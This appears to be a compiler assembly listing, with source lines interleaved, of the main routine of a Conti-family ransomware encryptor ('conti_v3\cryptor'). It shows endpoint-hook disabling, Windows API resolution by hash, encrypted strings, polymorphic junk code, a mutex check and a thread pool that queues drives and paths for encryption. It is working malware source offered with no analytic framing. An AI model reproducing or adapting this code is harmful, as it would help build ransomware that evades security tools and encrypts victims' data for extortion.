; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT WinMain
_TEXT	SEGMENT
_morph_var$19 = 48
_morph_var$20 = 48
_morph_var$21 = 48
_morph_var$22 = 48
_morph_var$23 = 48
_morph_var$24 = 48
_morph_var$25 = 48
_morph_var$26 = 48
_morph_var$27 = 48
_morph_var$28 = 48
_morph_var$29 = 48
_morph_var$30 = 48
$T1 = 56
$T5 = 88
$T13 = 120
DriveList$ = 152
PidList$ = 168
SystemInfo$ = 184
__$ArrayPad$ = 232
hInstance$ = 272
hPrevInstance$ = 280
lpCmdLine$ = 288
nShowCmd$ = 296
WinMain	PROC						; COMDAT

; 202  : {

$LN1359:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000f	55		 push	 rbp
  00010	41 56		 push	 r14
  00012	41 57		 push	 r15
  00014	48 8d 6c 24 b9	 lea	 rbp, QWORD PTR [rsp-71]
  00019	48 81 ec f0 00
	00 00		 sub	 rsp, 240		; 000000f0H
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c4	 xor	 rax, rsp
  0002a	48 89 45 3f	 mov	 QWORD PTR __$ArrayPad$[rbp-169], rax

; 203  : 	filesystem::DRIVE_LIST DriveList;
; 204  : 	TAILQ_INIT(&DriveList);

  0002e	48 8d 45 ef	 lea	 rax, QWORD PTR DriveList$[rbp-169]
  00032	45 33 ff	 xor	 r15d, r15d
  00035	4c 89 7d ef	 mov	 QWORD PTR DriveList$[rbp-169], r15
  00039	48 89 45 f7	 mov	 QWORD PTR DriveList$[rbp-161], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0003d	c7 45 87 0f 1f
	18 00		 mov	 DWORD PTR _morph_var$30[rbp-169], 1580815 ; 00181f0fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 208  : 	if (!getapi::InitializeGetapiModule()) {

  00044	e8 00 00 00 00	 call	 ?InitializeGetapiModule@getapi@@YAHXZ ; getapi::InitializeGetapiModule
  00049	85 c0		 test	 eax, eax
  0004b	0f 84 6f 0c 00
	00		 je	 $LN1183@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00051	c7 45 87 0f 1f
	18 00		 mov	 DWORD PTR _morph_var$29[rbp-169], 1580815 ; 00181f0fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 214  : 	DisableHooks();

  00058	e8 00 00 00 00	 call	 ?DisableHooks@@YAXXZ	; DisableHooks
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 294  : 	pFunction = (LPWSTR(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8a0ae76f, 85);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));

  0005d	41 8d 57 0f	 lea	 edx, QWORD PTR [r15+15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00061	c7 45 87 0f 1f
	18 00		 mov	 DWORD PTR _morph_var$25[rbp-169], 1580815 ; 00181f0fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 294  : 	pFunction = (LPWSTR(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8a0ae76f, 85);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));

  00068	45 8d 4f 55	 lea	 r9d, QWORD PTR [r15+85]
  0006c	41 b8 6f e7 0a
	8a		 mov	 r8d, -1978996881	; 8a0ae76fH
  00072	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 295  : 	return pFunction();

  00077	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 220  : 	HandleCommandLine((PWSTR)CmdLine);

  00079	48 8b c8	 mov	 rcx, rax
  0007c	e8 00 00 00 00	 call	 ?HandleCommandLine@@YAHPEA_W@Z ; HandleCommandLine

; 221  : #else
; 222  : 
; 223  : 	LPWSTR CmdLine = (LPWSTR)L"C:\\1.exe -nomutex -size 20";
; 224  : 
; 225  : 	morphcode(CmdLine);
; 226  : 
; 227  : 	HandleCommandLine((PWSTR)CmdLine);
; 228  : 
; 229  : #endif
; 230  : 
; 231  : 	if (!g_NoMutex) {

  00081	44 39 3d 00 00
	00 00		 cmp	 DWORD PTR ?g_NoMutex@@3HA, r15d ; g_NoMutex
  00088	0f 85 1e 01 00
	00		 jne	 $LN13@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0008e	44 88 7d 8f	 mov	 BYTE PTR $T1[rbp-169], r15b
  00092	c6 45 90 5a	 mov	 BYTE PTR $T1[rbp-168], 90 ; 0000005aH
  00096	c6 45 91 7e	 mov	 BYTE PTR $T1[rbp-167], 126 ; 0000007eH
  0009a	c6 45 92 5f	 mov	 BYTE PTR $T1[rbp-166], 95 ; 0000005fH
  0009e	c6 45 93 55	 mov	 BYTE PTR $T1[rbp-165], 85 ; 00000055H
  000a2	c6 45 94 79	 mov	 BYTE PTR $T1[rbp-164], 121 ; 00000079H
  000a6	c6 45 95 79	 mov	 BYTE PTR $T1[rbp-163], 121 ; 00000079H
  000aa	c6 45 96 13	 mov	 BYTE PTR $T1[rbp-162], 19
  000ae	c6 45 97 55	 mov	 BYTE PTR $T1[rbp-161], 85 ; 00000055H
  000b2	c6 45 98 2d	 mov	 BYTE PTR $T1[rbp-160], 45 ; 0000002dH
  000b6	c6 45 99 50	 mov	 BYTE PTR $T1[rbp-159], 80 ; 00000050H
  000ba	c6 45 9a 09	 mov	 BYTE PTR $T1[rbp-158], 9
  000be	c6 45 9b 04	 mov	 BYTE PTR $T1[rbp-157], 4
  000c2	c6 45 9c 79	 mov	 BYTE PTR $T1[rbp-156], 121 ; 00000079H
  000c6	c6 45 9d 62	 mov	 BYTE PTR $T1[rbp-155], 98 ; 00000062H
  000ca	c6 45 9e 53	 mov	 BYTE PTR $T1[rbp-154], 83 ; 00000053H
  000ce	c6 45 9f 09	 mov	 BYTE PTR $T1[rbp-153], 9
  000d2	c6 45 a0 2c	 mov	 BYTE PTR $T1[rbp-152], 44 ; 0000002cH
  000d6	c6 45 a1 55	 mov	 BYTE PTR $T1[rbp-151], 85 ; 00000055H
  000da	c6 45 a2 5a	 mov	 BYTE PTR $T1[rbp-150], 90 ; 0000005aH
  000de	c6 45 a3 16	 mov	 BYTE PTR $T1[rbp-149], 22
  000e2	c6 45 a4 62	 mov	 BYTE PTR $T1[rbp-148], 98 ; 00000062H
  000e6	c6 45 a5 16	 mov	 BYTE PTR $T1[rbp-147], 22
  000ea	c6 45 a6 25	 mov	 BYTE PTR $T1[rbp-146], 37 ; 00000025H
  000ee	c6 45 a7 11	 mov	 BYTE PTR $T1[rbp-145], 17
  000f2	c6 45 a8 67	 mov	 BYTE PTR $T1[rbp-144], 103 ; 00000067H
  000f6	c6 45 a9 60	 mov	 BYTE PTR $T1[rbp-143], 96 ; 00000060H
  000fa	0f b6 45 90	 movzx	 eax, BYTE PTR $T1[rbp-168]

; 58   :         return m_isDecrypted;

  000fe	0f b6 45 8f	 movzx	 eax, BYTE PTR $T1[rbp-169]

; 63   :         if (!isDecrypted())

  00102	84 c0		 test	 al, al
  00104	75 5f		 jne	 SHORT $LN687@WinMain

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00106	45 8b cf	 mov	 r9d, r15d
  00109	0f 1f 80 00 00
	00 00		 npad	 7
$LL688@WinMain:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00110	42 0f b6 4c 0d
	90		 movzx	 ecx, BYTE PTR $T1[rbp+r9-168]

; 40   :     return (a % n + n) % n;

  00116	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0011b	83 e9 60	 sub	 ecx, 96			; 00000060H
  0011e	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00122	41 f7 e8	 imul	 r8d
  00125	41 03 d0	 add	 edx, r8d
  00128	c1 fa 06	 sar	 edx, 6
  0012b	8b c2		 mov	 eax, edx
  0012d	c1 e8 1f	 shr	 eax, 31
  00130	03 d0		 add	 edx, eax
  00132	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00135	44 2b c0	 sub	 r8d, eax
  00138	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0013d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00141	41 f7 e8	 imul	 r8d
  00144	41 03 d0	 add	 edx, r8d
  00147	c1 fa 06	 sar	 edx, 6
  0014a	8b c2		 mov	 eax, edx
  0014c	c1 e8 1f	 shr	 eax, 31
  0014f	03 d0		 add	 edx, eax
  00151	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00154	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00157	46 88 44 0d 90	 mov	 BYTE PTR $T1[rbp+r9-168], r8b
  0015c	49 ff c1	 inc	 r9
  0015f	49 83 f9 1a	 cmp	 r9, 26
  00163	72 ab		 jb	 SHORT $LL688@WinMain
$LN687@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 305  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x20d8fa8c, 84);//GetProcAddress(hKernel32, OBFA("CreateMutexA"));

  00165	ba 0f 00 00 00	 mov	 edx, 15
  0016a	41 b8 8c fa d8
	20		 mov	 r8d, 551090828		; 20d8fa8cH
  00170	44 8d 4a 45	 lea	 r9d, QWORD PTR [rdx+69]
  00174	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 306  : 	return pFunction(lpMutexAttributes, bInitialOwner, lpName);

  00179	4c 8d 45 90	 lea	 r8, QWORD PTR $T1[rbp-168]
  0017d	ba 01 00 00 00	 mov	 edx, 1
  00182	33 c9		 xor	 ecx, ecx
  00184	ff d0		 call	 rax

; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00186	ba 0f 00 00 00	 mov	 edx, 15
  0018b	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H

; 306  : 	return pFunction(lpMutexAttributes, bInitialOwner, lpName);

  00191	48 8b d8	 mov	 rbx, rax

; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00194	44 8d 4a 53	 lea	 r9d, QWORD PTR [rdx+83]
  00198	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  0019d	33 d2		 xor	 edx, edx
  0019f	48 8b cb	 mov	 rcx, rbx
  001a2	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 234  : 		if (pWaitForSingleObject(hMutex, 0) != WAIT_OBJECT_0) {

  001a4	85 c0		 test	 eax, eax
  001a6	0f 85 14 0b 00
	00		 jne	 $LN1183@WinMain
$LN13@WinMain:

; 235  : 			return EXIT_FAILURE;
; 236  : 		}
; 237  : 
; 238  : 	}
; 239  : 
; 240  : 	if (global::GetEncryptMode() == PATH_ENCRYPT) {

  001ac	83 3d 00 00 00
	00 0e		 cmp	 DWORD PTR ?g_EncryptMode@@3HA, 14 ; g_EncryptMode
  001b3	ba 0f 00 00 00	 mov	 edx, 15
  001b8	0f 85 f3 00 00
	00		 jne	 $LN14@WinMain
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  001be	48 8d 05 40 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+64
  001c5	4c 89 3d 40 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+64, r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  001cc	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  001d0	48 89 05 48 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+72, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  001d7	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 135  : 	ThreadPoolInfo->ThreadsCount = ThreadsCount;

  001dd	48 c7 05 08 00
	00 00 01 00 00
	00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8, 1

; 136  : 	ThreadPoolInfo->IsActive = FALSE;

  001e8	44 89 3d 10 00
	00 00		 mov	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, r15d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  001ef	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  001f4	48 8d 0d 18 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+24
  001fb	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  001fd	b9 08 00 00 00	 mov	 ecx, 8
  00202	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00207	33 c9		 xor	 ecx, ecx
  00209	48 89 08	 mov	 QWORD PTR [rax], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  0020c	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A, rax

; 139  : 	if (!ThreadPoolInfo->hThreads) {

  00213	48 85 c0	 test	 rax, rax
  00216	0f 84 a4 0a 00
	00		 je	 $LN1183@WinMain

; 162  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  0021c	48 39 0d 08 00
	00 00		 cmp	 QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8, rcx
  00223	49 8b df	 mov	 rbx, r15
  00226	c7 05 10 00 00
	00 01 00 00 00	 mov	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, 1
  00230	76 57		 jbe	 SHORT $LN775@WinMain
  00232	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL776@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  00240	ba 0f 00 00 00	 mov	 edx, 15
  00245	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0024b	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0024f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00254	4c 8d 0d 00 00
	00 00		 lea	 r9, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  0025b	4c 89 7c 24 28	 mov	 QWORD PTR [rsp+40], r15
  00260	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ; ThreadpoolHandler
  00267	44 89 7c 24 20	 mov	 DWORD PTR [rsp+32], r15d
  0026c	33 d2		 xor	 edx, edx
  0026e	33 c9		 xor	 ecx, ecx
  00270	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 163  : 		ThreadPoolInfo->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadpoolHandler, ThreadPoolInfo, 0, NULL);

  00272	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A
  00279	48 89 04 d9	 mov	 QWORD PTR [rcx+rbx*8], rax
  0027d	48 ff c3	 inc	 rbx
  00280	48 3b 1d 08 00
	00 00		 cmp	 rbx, QWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+8
  00287	72 b7		 jb	 SHORT $LL776@WinMain
$LN775@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 251  : 		threadpool::PutTask(threadpool::LOCAL_THREADPOOL, g_Path);

  00289	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00290	48 8d 4d af	 lea	 rcx, QWORD PTR $T5[rbp-169]
  00294	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00299	48 8b d0	 mov	 rdx, rax
  0029c	33 c9		 xor	 ecx, ecx
  0029e	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask

; 252  : 		threadpool::Wait(threadpool::LOCAL_THREADPOOL);

  002a3	33 c9		 xor	 ecx, ecx
  002a5	e8 00 00 00 00	 call	 ?Wait@threadpool@@YAXH@Z ; threadpool::Wait

; 253  : 		return EXIT_SUCCESS;

  002aa	33 c0		 xor	 eax, eax
  002ac	e9 14 0a 00 00	 jmp	 $LN1@WinMain
$LN14@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 237  : 	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));

  002b1	41 b9 5a 00 00
	00		 mov	 r9d, 90			; 0000005aH
  002b7	41 b8 b1 67 14
	de		 mov	 r8d, -569088079		; de1467b1H
  002bd	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 238  : 	return pFunction(lpSystemInfo);

  002c2	48 8d 4d 0f	 lea	 rcx, QWORD PTR SystemInfo$[rbp-169]
  002c6	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 260  : 	morphcode(SystemInfo.wProcessorArchitecture);

  002c8	44 0f b7 45 0f	 movzx	 r8d, WORD PTR SystemInfo$[rbp-169]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  002cd	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002d2	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$26[rbp-169], 1547201 ; 00179bc1H
  002d9	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$26[rbp-169]
  002dc	f7 e9		 imul	 ecx
  002de	8b c2		 mov	 eax, edx
  002e0	c1 e8 1f	 shr	 eax, 31
  002e3	03 d0		 add	 edx, eax
  002e5	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002e8	3b c8		 cmp	 ecx, eax
  002ea	74 43		 je	 SHORT $LN724@WinMain

; 49   : 		_morph_var += (int)a + 2;

  002ec	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$26[rbp-169]
  002ef	83 c1 02	 add	 ecx, 2
  002f2	41 03 c8	 add	 ecx, r8d
  002f5	89 4d 87	 mov	 DWORD PTR _morph_var$26[rbp-169], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  002f8	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]
  002fb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00300	7d 07		 jge	 SHORT $LN1216@WinMain
  00302	ff c8		 dec	 eax
  00304	83 c8 fc	 or	 eax, -4
  00307	ff c0		 inc	 eax
$LN1216@WinMain:
  00309	85 c0		 test	 eax, eax
  0030b	75 73		 jne	 SHORT $LN723@WinMain
  0030d	0f 1f 00	 npad	 3
$LL716@WinMain:
  00310	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]
  00313	ff c0		 inc	 eax
  00315	89 45 87	 mov	 DWORD PTR _morph_var$26[rbp-169], eax
  00318	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]
  0031b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00320	7d 07		 jge	 SHORT $LN1215@WinMain
  00322	ff c8		 dec	 eax
  00324	83 c8 fc	 or	 eax, -4
  00327	ff c0		 inc	 eax
$LN1215@WinMain:
  00329	85 c0		 test	 eax, eax
  0032b	74 e3		 je	 SHORT $LL716@WinMain

; 51   : 	}

  0032d	eb 51		 jmp	 SHORT $LN723@WinMain
$LN724@WinMain:

; 52   : 	else if (_morph_var % 2) {

  0032f	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]

; 53   : 		_morph_var -= (int)a - 2;

  00332	b9 02 00 00 00	 mov	 ecx, 2
  00337	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]
  0033a	41 2b c8	 sub	 ecx, r8d
  0033d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0033f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00344	89 4d 87	 mov	 DWORD PTR _morph_var$26[rbp-169], ecx
  00347	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$26[rbp-169]
  0034a	f7 e9		 imul	 ecx
  0034c	8b c2		 mov	 eax, edx
  0034e	c1 e8 1f	 shr	 eax, 31
  00351	03 d0		 add	 edx, eax
  00353	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00356	3b c8		 cmp	 ecx, eax
  00358	75 26		 jne	 SHORT $LN723@WinMain
  0035a	66 0f 1f 44 00
	00		 npad	 6
$LL718@WinMain:
  00360	8b 45 87	 mov	 eax, DWORD PTR _morph_var$26[rbp-169]
  00363	ff c0		 inc	 eax
  00365	89 45 87	 mov	 DWORD PTR _morph_var$26[rbp-169], eax
  00368	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0036d	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$26[rbp-169]
  00370	f7 e9		 imul	 ecx
  00372	8b c2		 mov	 eax, edx
  00374	c1 e8 1f	 shr	 eax, 31
  00377	03 d0		 add	 edx, eax
  00379	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0037c	3b c8		 cmp	 ecx, eax
  0037e	74 e0		 je	 SHORT $LL718@WinMain
$LN723@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 262  : 	SIZE_T ThreadsCountForPool = global::GetEncryptMode() == ALL_ENCRYPT ? SystemInfo.dwNumberOfProcessors : SystemInfo.dwNumberOfProcessors * 2;

  00380	83 3d 00 00 00
	00 0a		 cmp	 DWORD PTR ?g_EncryptMode@@3HA, 10 ; g_EncryptMode
  00387	75 05		 jne	 SHORT $LN33@WinMain
  00389	8b 75 2f	 mov	 esi, DWORD PTR SystemInfo$[rbp-137]
  0038c	eb 06		 jmp	 SHORT $LN34@WinMain
$LN33@WinMain:
  0038e	8b 45 2f	 mov	 eax, DWORD PTR SystemInfo$[rbp-137]
  00391	8d 34 00	 lea	 esi, DWORD PTR [rax+rax]
$LN34@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00394	c7 45 87 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$27[rbp-169], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0039b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003a0	8b 4d 87	 mov	 ecx, DWORD PTR _morph_var$27[rbp-169]
  003a3	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 262  : 	SIZE_T ThreadsCountForPool = global::GetEncryptMode() == ALL_ENCRYPT ? SystemInfo.dwNumberOfProcessors : SystemInfo.dwNumberOfProcessors * 2;

  003a5	44 8b f6	 mov	 r14d, esi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  003a8	8b c2		 mov	 eax, edx
  003aa	c1 e8 1f	 shr	 eax, 31
  003ad	03 d0		 add	 edx, eax
  003af	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003b2	3b c8		 cmp	 ecx, eax
  003b4	74 49		 je	 SHORT $LN745@WinMain

